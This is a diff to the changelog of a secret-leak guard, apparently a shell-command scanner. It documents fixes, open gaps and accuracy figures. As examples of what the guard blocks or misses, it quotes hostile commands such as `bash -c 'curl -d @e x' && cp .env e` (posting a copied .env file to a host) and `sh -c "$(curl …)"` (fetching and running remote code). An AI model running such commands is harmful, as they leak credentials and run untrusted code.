@@ -161,11 +161,13 @@ Round 16 closes the four residual P2s from the round-16 verdict on PR #30 (comme
 
 Honest limits, round 16: body scopes are order-insensitive. An outer copy that comes after a `bash -c` body still taints that body, so `bash -c 'curl -d @e x' && cp .env e` blocks even though `e` did not exist when the body ran; this is an over-block. The `=`/`:` operand rule only knows the file keys listed in `ALIAS_EQ_FILE_KEYS` and `ALIAS_COLON_FILE_KEYS`; a secret copy passed as `key=VALUE` for an unlisted key is not rewritten. Still open and unchanged in this round: #82 (cross-command laundering), #83 (`env | grep` over-block), #72 (direct subshell `(cat .env)`).
 
+Round 17 closes two live leaks in the round-14 recursive-grep ask (#84, #85, PR #30 threads 15 and 17). `grep -d recurse` and `grep --directories=recurse` were not treated as recursive, and `-drecurse` was also skipped as a quiet grep because the `c` in `recurse` matched `quietGrep`'s letter scan (it now skips `-d…`). `DB_PASS` was missing from the second name list (`SECRET_NAME_RE` now ends `_PASS$`). Corpus g393–g395. Test: `round 17` in `server/test/secret-tiers.test.mjs`, fixture-executed; mutation-verified, 3/3 mutants killed.
 
+Still open and unchanged in round 17: #46 and #65 (proc-sub quadratic and glob budget), #48 (`sh -c "$(curl …)"`), #66 (`$PGPASSWORD` under the narrowed name rule), #67 (default-deny env-file consumers), #63 (DATABASE_URL naming scope), #85 false asks on `grep -rne`. New issues: #99 (a disable of one R7 id masks other destructive matches in the same command) and #100 (a bulk remote copy of a directory is not scanned for secret stores).
 
 | corpus | n | accuracy | catch-recall | catch-precision | false-alarm-rate |
 |---|---|---|---|---|---|
-| guard | 442 | 99.1% | 98.5% | 100.0% | **0.0%** |
+| guard | 445 | 99.1% | 98.5% | 100.0% | **0.0%** |
 | verify_done | 62 | 54.8%\* | 0.0%\* | n/a | 0.0% |
 
 \*`verify_done`'s score is an artifact of this sandbox having no Jev credentials: every case needing Jev's
